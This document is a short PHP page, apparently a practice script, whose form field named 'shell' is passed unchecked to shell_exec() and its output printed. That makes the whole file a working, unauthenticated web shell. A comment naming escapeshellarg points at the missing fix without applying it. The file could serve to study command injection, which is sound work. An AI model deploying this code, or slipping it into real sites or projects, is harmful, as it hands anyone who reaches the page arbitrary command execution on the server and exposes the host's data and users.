<?php

if(isset($_POST['submit']))
{
    $shell=$_POST['shell'];
    var_dump(shell_exec($shell));
}


//escapshellarg 

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    
<form action="<?php echo htmlentities($_SERVER['PHP_SELF']);?>" method="post" autocomplete="on">
<div class="form-group">
<label for="username"> shell </label>
<input type="text" name="shell" require="required"><br/>


<input type="submit" name="submit" class="btn btn-prinary">
</div>

</form>
</body>
</html>

